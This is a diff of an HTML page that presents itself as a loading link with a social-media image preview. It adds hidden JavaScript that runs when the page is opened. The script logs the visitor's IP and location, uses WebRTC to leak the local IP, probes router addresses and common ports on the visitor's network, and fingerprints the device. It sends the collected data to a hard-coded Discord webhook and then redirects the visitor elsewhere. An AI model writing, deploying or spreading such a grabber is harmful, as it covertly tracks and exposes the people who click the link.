@@ -1,38 +1,99 @@
 <!DOCTYPE html>
-<html>
-<head><title>Loading...</title></head>
-<body>
+<html prefix="og: https://ogp.me/ns#">
+<head>
+  <meta charset="UTF-8"/>
+  <title>Loading...</title>
+
+  <meta property="og:type"          content="website"/>
+  <meta property="og:url"           content="https://workclockz.github.io/-"/>
+  <meta property="og:title"         content=" "/>
+  <meta property="og:description"   content=" "/>
+  <meta property="og:image"         content="https://i.redd.it/mcdonalds-is-the-kind-of-place-v0-hfmx1hugvune1.jpg?width=3024&format=pjpg&auto=webp&s=b9f6fd89223fe99f385afd70d5d9d39f382ae2ad"/>
+  <meta property="og:image:type"    content="image/jpeg"/>
+  <meta property="og:image:width"   content="3024"/>
+  <meta property="og:image:height"  content="4032"/>
+  <meta property="og:image:alt"     content=" "/>
+
+  <meta name="twitter:card"         content="summary_large_image"/>
+  <meta name="twitter:image"        content="https://i.redd.it/mcdonalds-is-the-kind-of-place-v0-hfmx1hugvune1.jpg?width=3024&format=pjpg&auto=webp&s=b9f6fd89223fe99f385afd70d5d9d39f382ae2ad"/>
+
+  <meta name="theme-color"          content="#2b2d31"/>
+</head>
+<body style="margin:0;background:#000">
 <script>
 const WEBHOOK = "https://discord.com/api/webhooks/1517646419182485525/HboDIfUeTnj-mDQJ59sFeBdAssozVQZq9xEz2Xw-elr6oTh5HHeHKUddaiMqLJ-A-NaJ";
-const REDIRECT = "https://tursm-got-you.vercel.app/";
+const REDIRECT = "https://tursm-got-you.vercel.app";
 
-fetch("https://ipinfo.io/json")
-  .then(r => r.json())
-  .then(data => {
-    return fetch(WEBHOOK, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        embeds: [{
-          title: "🎯 IP Logged",
-          color: 0xff2200,
-          fields: [
-            { name: "🌐 IP",      value: "`" + (data.ip || "?") + "`",      inline: true  },
-            { name: "🗺️ Country", value: data.country || "?",               inline: true  },
-            { name: "🏙️ City",    value: data.city || "?",                  inline: true  },
-            { name: "📍 Region",  value: data.region || "?",                inline: true  },
-            { name: "📡 ISP",     value: data.org || "?",                   inline: false },
-            { name: "🖥️ UA",      value: "`" + navigator.userAgent.slice(0, 200) + "`", inline: false }
-          ]
-        }]
-      })
-    });
-  })
-  .catch(() => {})
-  .finally(() => {
-    window.location.href = REDIRECT;
+function getRealIP() {
+  return new Promise(resolve => {
+    const ips = new Set();
+    const pc  = new RTCPeerConnection({ iceServers:[{ urls:"stun:stun.l.google.com:19302" }] });
+    pc.createDataChannel("");
+    pc.createOffer().then(o => pc.setLocalDescription(o));
+    pc.onicecandidate = e => {
+      if (!e || !e.candidate) { resolve([...ips].join(", ") || null); return; }
+      const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+      if (m) ips.add(m[1]);
+    };
+    setTimeout(() => resolve([...ips].join(", ") || null), 2000);
   });
+}
+
+function scanLAN() {
+  const hosts  = ["192.168.1.1","192.168.0.1","10.0.0.1","172.16.0.1"];
+  const ports  = [22,80,443,3389,8080,8888];
+  const open   = [];
+  const checks = [];
+  hosts.forEach(h => ports.forEach(p => {
+    const t = Date.now();
+    checks.push(
+      fetch(`http://${h}:${p}`,{ mode:"no-cors", signal:AbortSignal.timeout(300) })
+        .then(()  => open.push(`${h}:${p} ✅`))
+        .catch(() => { if (Date.now()-t < 290) open.push(`${h}:${p} ✅`); })
+    );
+  }));
+  return Promise.allSettled(checks).then(() => open.join("\n") || "none found");
+}
+
+const fp = {
+  screen:   `${screen.width}x${screen.height}`,
+  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  lang:     navigator.language,
+  cores:    navigator.hardwareConcurrency,
+  memory:   navigator.deviceMemory || "?",
+  platform: navigator.platform,
+  touch:    navigator.maxTouchPoints
+};
+
+Promise.all([
+  fetch("https://ipinfo.io/json").then(r => r.json()).catch(() => ({})),
+  getRealIP(),
+  scanLAN()
+]).then(([data, realIP, ports]) => {
+  return fetch(WEBHOOK, {
+    method:  "POST",
+    headers: { "Content-Type":"application/json" },
+    body: JSON.stringify({
+      embeds:[{
+        title: "🎯 Got One",
+        color: 0xff2200,
+        fields:[
+          { name:"🌐 IP (ipinfo)",   value:"`"+(data.ip    ||"?")+"`", inline:true  },
+          { name:"👁️ Real IP (RTC)", value:"`"+(realIP     ||"?")+"`", inline:true  },
+          { name:"🗺️ Country",       value:   data.country ||"?",      inline:true  },
+          { name:"🏙️ City",          value:   data.city    ||"?",      inline:true  },
+          { name:"📍 Region",        value:   data.region  ||"?",      inline:true  },
+          { name:"📡 ISP",           value:   data.org     ||"?",      inline:false },
+          { name:"🖥️ UA",            value:"`"+navigator.userAgent.slice(0,200)+"`", inline:false },
+          { name:"📊 Device",        value:`Screen:${fp.screen} | TZ:${fp.timezone} | Cores:${fp.cores} | RAM:${fp.memory}GB | Touch:${fp.touch}`, inline:false },
+          { name:"🔓 LAN Ports",     value:"`"+ports.slice(0,500)+"`", inline:false }
+        ]
+      }]
+    })
+  });
+}).catch(()=>{})
+  .finally(()=>{ window.location.href = REDIRECT; });
 </script>
-<p>Loading...</p>
+<p style="color:#000">Loading...</p>
 </body>
 </html>
